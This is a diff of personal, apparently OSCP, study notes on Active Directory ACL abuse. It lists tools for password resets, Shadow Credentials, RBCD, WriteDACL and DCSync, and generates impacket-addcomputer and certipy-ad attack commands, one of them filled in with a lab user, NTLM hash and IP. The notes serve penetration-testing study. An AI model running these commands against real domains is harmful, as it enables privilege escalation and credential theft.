@@ -1,3 +1,25 @@
+[[ACL Abuse]]
+
+Password reset
+`net rpc`
+
+Add group member
+`net rpc`
+
+Shadow Credentials
+`certipy-ad`
+
+If Fail VV
+RBCD
+
+`impacket` / `rbcd.py`
+
+WriteDACL / WriteOwner
+`impacket-dacledit` / `bloodyAD`
+
+DCSync
+`impacket-secretsdump`
+
 # GenericAll
 
 "Full Control" over the target object. You own it completely.
@@ -11,6 +33,14 @@
 - **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
 
 Check if account is enabled through bloodhound
+
+- GenericAll over a user: Try Shadow Credentials first.
+    
+- GenericAll over a computer: 
+1. Shadow Credentials 
+2. [[RBCD]].
+    
+- GenericAll over a group: Shadow Credentials isn't the appropriate default; investigate group membership modification.
 
 ## Change password
 ```dataviewjs
@@ -48,7 +78,7 @@ const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [a
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Make this target account owned by our account first.
+
 #### Change Account Owner
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
@@ -119,6 +149,20 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ---
 
+## Make a new account
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-addcomputer ${discoveredDomain}/[adminUser] -dc-ip ${ip} -hashes :[hash] -computer-name 'ATTACKER$' -computer-pass 'Attacker123'`
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+[*] Successfully added machine account ATTACKER$ with password Attacker123.
+
+---
 ## Enable account
 
 ```
@@ -136,6 +180,27 @@ const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [a
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+Computer object + PThash syntax
+
+certipy-ad shadow auto \  
+-u L.Livingstone@resourced.local \  
+-hashes :19a3a7550ce8c505c2d46b5e39d6f808 \  
+-account 'RESOURCEDC$' \  
+-dc-ip 192.168.228.175 \ 
+-dc-host 'RESOURCEDC.RESOURCED.LOCAL' -target-ip 192.168.228.175 
+
+-ldap-scheme ldap -ldap-port 389 -debug
+
+Make this target account owned by our account first.
+
+---
+
+# [[RBCD]]
+
+
+---
+
 ## Abuse the `Account Operators` permissions
 
 Add an account into this vulnerable group using `GenericAll` to progress to the next step
